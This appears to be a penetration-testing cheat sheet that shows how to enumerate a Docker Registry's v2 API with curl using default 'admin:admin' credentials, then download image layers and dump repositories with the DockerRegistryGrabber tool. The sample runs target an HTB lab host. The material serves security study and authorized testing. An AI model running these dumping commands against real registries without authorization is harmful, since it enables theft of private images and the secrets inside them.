---
title: "Docker Registry"
date: 2024-7-12
tags: ["Database Dumping", "Docker", "Container", "Docker Registry"]
---

### Docker Registry API

```console
# List repos
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/_catalog
```

```console {class="sample-code"}
$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/_catalog
{"repositories":["bolt-image"]}
```

```console
# List of tags of this repo
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/tags/list
```

```console {class="sample-code"}
$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/tags/list
{"name":"bolt-image","tags":["latest"]}
```

```console
# List manifest file for this tag (e.g. latest)
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/manifests/<TAG>
```

```console {class="sample-code"}
$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/manifests/latest
{
   "schemaVersion": 1,
   "name": "bolt-image",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b"
      },
      {
         "blobSum": "sha256:3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee"
      },
      {
         "blobSum": "sha256:02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c"
      },
      ---[SNIP]---
}
```

```console
# Get a commit of the image
curl -s -k --user "<USER>:<PASSWORD>" <TARGET>/v2/<REPO_NAME>/blobs/sha256:<BLOB_HASH> > <BLOB_HASH>.tar.gz
```

```console {class="sample-code"}
$ curl -s -k --user "admin:admin" https://docker.registry.htb/v2/bolt-image/blobs/sha256:302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b > 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b.tar.gz
```

---

### Docker Registry Dump

{{< tab set1 tab1 >}}DockerRegistryGrabber{{< /tab >}}
{{< tabcontent set1 tab1 >}}

```console
# List repos
python3 drg.py <TARGET> -p <PORT> -U '<USER>' -P '<PASSWORD>' --list
```

```console {class="sample-code"}
$ python3 drg.py https://docker.registry.htb -p 443 -U 'admin' -P 'admin' --list
[+] bolt-image
```

```console
# Dump repo
python3 drg.py <TARGET> -p <PORT> -U '<USER>' -P '<PASSWORD>' --dump <REPO_NAME>
```

```console {class="sample-code"}
$ python3 drg.py https://docker.registry.htb -p 443 -U 'admin' -P 'admin' --dump bolt-image
[+] BlobSum found 10
[+] Dumping bolt-image
    [+] Downloading : 302bfcb3f10c386a25a58913917257bd2fe772127e36645192fa35e4c6b3c66b
    [+] Downloading : 3f12770883a63c833eab7652242d55a95aea6e2ecd09e21c29d7d7b354f3d4ee
    [+] Downloading : 02666a14e1b55276ecb9812747cb1a95b78056f1d202b087d71096ca0b58c98c
    [+] Downloading : c71b0b975ab8204bb66f2b659fa3d568f2d164a620159fc9f9f185d958c352a7
---[SNIP]---
```

<small>*Ref: [DockerRegistryGrabber](https://github.com/Syzik/DockerRegistryGrabber)*</small>

{{< /tabcontent >}}
